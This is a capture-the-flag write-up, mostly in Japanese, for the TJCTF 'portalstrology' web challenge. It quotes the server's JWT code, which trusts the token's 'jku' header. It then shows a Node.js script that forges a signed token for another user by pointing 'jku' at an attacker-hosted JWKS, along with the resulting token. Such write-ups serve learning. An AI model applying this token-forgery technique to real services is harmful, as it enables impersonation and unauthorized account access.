# portalstrology:web:361pts
I applied to DNU this year, and the admission results are coming out on May 17! But I really want to know my decision now though. I heard that other colleges had problems with accidentally leaking college decisions, you think DNU did the same?  
Unfortunately, I forgot my password too, so you gotta figure that out as well. My username is `superigamerbean`.  
[dnu-financial-aid.tjc.tf](https://dnu-financial-aid.tjc.tf/)  

Downloads  
[server.zip](server.zip)  

# Solution
サイトとソースが渡される。  
May 17, 5 PM EDTに情報公開があるらしいがCTFが終わっている。  
DNU Financial Aid Center  
[site.png](site/site.png)  
ひとまず登録し、ログインすると申請していないといわれる。  
[finaid.png](site/finaid.png)  
おそらく問題文に書かれている`superigamerbean`でログインし、公開されていない未来の情報を読み取る必要がありそうだ。  
ソースは以下のようであった。  
```js
~~~
function generate_token(req, res, next) {
    const username = req.body.username
    const privatekey = fs.readFileSync(`${__dirname}/private/private.key`, 'utf8')
    const token = jwt.sign(
        {
            username,
        },
        privatekey,
        {
            algorithm: 'RS256',
            expiresIn: "2h",
            header: {
                alg: 'RS256',
                jku: process.env.ENV === "development" ? 'http://localhost:3000/jwks.json' : 'https://dnu-financial-aid.tjc.tf/jwks.json',
                kid: '1',
            }
        }
    )
    res.cookie("jwt", token)
    next()
}

function check_logged_in(req, res, next) {
    try {
        const token = req.cookies.jwt
        const decoded = jwt.verify(token, SECRET)
        res.redirect('/finaid')
    }
    catch {
        next()
    }
}

async function check_token(req, res, next) {
    try {
        const token = req.cookies.jwt

        const { header } = jwt.decode(token, { complete: true })
        const { kid } = header
        const jwksURI = header.jku

        await axios.get(jwksURI).then(function (response) {
            const signedKey = response.data
            const keySet = jwk.JWKSet.fromObject(signedKey)
            const key = keySet.findKeyById(kid).key.toPublicKeyPEM()

            const decoded = jwt.verify(token, key, { algorithms: ['RS256'] })

            res.locals.username = decoded.username
            res.locals.iat = decoded.iat
            next()
        })
    }
    catch {
        res.redirect('/logout')
    }
}
~~~
app.get('/finaid', [check_token, check_user_applied], (req, res) => {
    if (res.locals.iat >= 1652821200) {
        res.render('finaid', { flag: `${FLAG}`, username: res.locals.username, applied: res.locals.applied })
    }
    else {
        res.render('finaid', { flag: undefined, username: res.locals.username, applied: res.locals.applied })
    }
})
~~~
```
`iat`が`1652821200`以上であればflagが得られるようだ。  
パスワードを予測したログインなどはできるわけもなく、`iat`の条件も満たせないので、jwtの改竄を目指すこととする。  
ソースにprivate.keyが含まれているため、こちらを利用しjwtを改竄しようとするが失敗する。  
問題サーバのものと異なると予測し、サーバのjwksとローカルのjwksを比較してみる。  
```bash
$ curl https://dnu-financial-aid.tjc.tf/jwks.json
{
    "keys": [
        {
            "kty": "RSA",
            "n": "0m3czq66wDL6nUxIVKrS2jq6YCP8c4bcnB4HKIYDrheD2wDN7cU0MBwXWMXZkbJTlmyLjbRTEsaRzpIag-pqI_dfaV_EON_j3F6WCGkGJYqu-In5cPvQpk-zQbRIDVB1VDRq0J4jtgyW-wx6-crlUhFibqN772qAKC0S6rPX6bD_2zxjRxxgcugxiJKOnPt8MRSWH-e7oWZkhhwI6drqHEN04DyiHzhDXpn4CvBkWnWCyxNMw2nNRdzkemhBXZQXs7unMuJv242uIl2E0zu5hE0FJvPH111GbFlVN1h2r7QcgKvmTA0WC5sz-b7YSdAb9O6X6gwtAe_1aFr9cGXl0w",
            "e": "AQAB",
            "alg": "RS256",
            "kid": "1",
            "use": "sig"
        }
    ]
}
$ curl http://localhost:3000/jwks.json
{
    "keys": [
        {
            "kid": "1",
            "kty": "RSA",
            "e": "AQAB",
            "use": "sig",
            "alg": "RS256",
            "n": "i30G3xbJG_4e61yFwteP7A7uqLeS08eSwbqnCQgGEb0yr0qElOzrukB21JjjWeEf5dJeDMEy5-fVYgIMTpcaxOf9sumlkpLP-izwjRqcerui76DzFl0vimSGkwZzgTQzV7u1pRkpOxisakarjnVxX0483X7jIS1P2JaQYSfyAaNCJkbeheviMqll65OUOZf-r2CqwfGDxGMZlO4iB0PSkJnAtyn0WGj-Z5aO5t3QWAB7Z3pbJ7oA-KPMqV_x1xX9Bb3sKs-8rjuMuTgDwAY84xOaiJQ5tv7i7RsnztKi1NjleQRxflZPww7A5go5icLn2ls2D44TPT8KugdpAOk7aQ"
        }
    ]
}
```
やはり異なるようだ。  
これでは改竄できないと思いながらjwtを見ていると以下のようになっていた。  
![jwt.png](images/jwt.png)  
`"jku": "https://dnu-financial-aid.tjc.tf/jwks.json"`との指定がなされている。  
ソースより、サーバ側でこちらのチェックをしているようだが何の制限もないことがわかる。  
つまりこのjkuをローカルのjwksをホスティングしたものに変え、ソースとして配布されたprivate.keyで署名すると正規のjwtとして成り立つ。  
あとは`username`と`iat`を改竄してやればよい。  
まずは[Beeceptor](https://beeceptor.com/)でローカルと同じjwksをホスティングする。  
```bash
$ curl https://satoki.free.beeceptor.com/jwks.json
{
    "keys": [
        {
            "kid": "1",
            "kty": "RSA",
            "e": "AQAB",
            "use": "sig",
            "alg": "RS256",
            "n": "i30G3xbJG_4e61yFwteP7A7uqLeS08eSwbqnCQgGEb0yr0qElOzrukB21JjjWeEf5dJeDMEy5-fVYgIMTpcaxOf9sumlkpLP-izwjRqcerui76DzFl0vimSGkwZzgTQzV7u1pRkpOxisakarjnVxX0483X7jIS1P2JaQYSfyAaNCJkbeheviMqll65OUOZf-r2CqwfGDxGMZlO4iB0PSkJnAtyn0WGj-Z5aO5t3QWAB7Z3pbJ7oA-KPMqV_x1xX9Bb3sKs-8rjuMuTgDwAY84xOaiJQ5tv7i7RsnztKi1NjleQRxflZPww7A5go5icLn2ls2D44TPT8KugdpAOk7aQ"
        }
    ]
}
```
次に以下のsato_jwt.jsにてjwtを生成する。  
`_private.key`は作成してもよい(言うまでもないがjkuを変更する必要がある)。  
今回は面倒なのですべて配布されたソースのものを使う。  
```js
const fs = require("fs")
const jwt = require("jsonwebtoken")

const username = "superigamerbean";
const iat = 1652821200;
const privatekey = fs.readFileSync(`_private.key`, 'utf8')
const token = jwt.sign(
    {
        username,
        iat,
    },
    privatekey,
    {
        algorithm: 'RS256',
        expiresIn: "2h",
        header: {
            alg: 'RS256',
            jku: 'https://satoki.free.beeceptor.com/jwks.json',
            kid: '1',
        }
    }
);

console.log(token);
```
実行する。  
```bash
$ node sato_jwt.js
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjEiLCJqa3UiOiJodHRwczovL3NhdG9raS5mcmVlLmJlZWNlcHRvci5jb20vandrcy5qc29uIn0.eyJ1c2VybmFtZSI6InN1cGVyaWdhbWVyYmVhbiIsImlhdCI6MTY1MjgyMTIwMCwiZXhwIjoxNjUyODI4NDAwfQ.VtvQQIvgJ5diSVAIfB52MMOYmTCEGygGPd4ichabdXSAlusReTLslzE7Ye4kaOdSz45tQpW8ry1kPBvzZlVu-haPSV3LXv6zvZwcAr7KwV4SnwTiqgWrbndj82iMLduO4vCa5D8nZYUfkvWOmi_upmr_exOm9HiJSsOUSYLqMyR9jmZCsduuRfz_MPlBCLbATZucZz7w22RspISdDF5RfP4XQI0r63-fAhu0jmeFgk8hmRU_WxdO_iVjnwmWCV80-kJTyM6zsIEdyGMkJJXDp7atplQiKa5WmKEGQNi-qHxZhozAMM2PrcUg109gUQngwLPrw7Y3pEwIZm8VDFeOMg
```
あとはjwtをcookieに設定してやればよい。  
`/finaid`にアクセスする。  
flag  
[flag.png](site/flag.png)  
ログインに成功し、flagが書かれていた。  

## tjctf{c01l3ges_plz_st0p_th3_l34k5}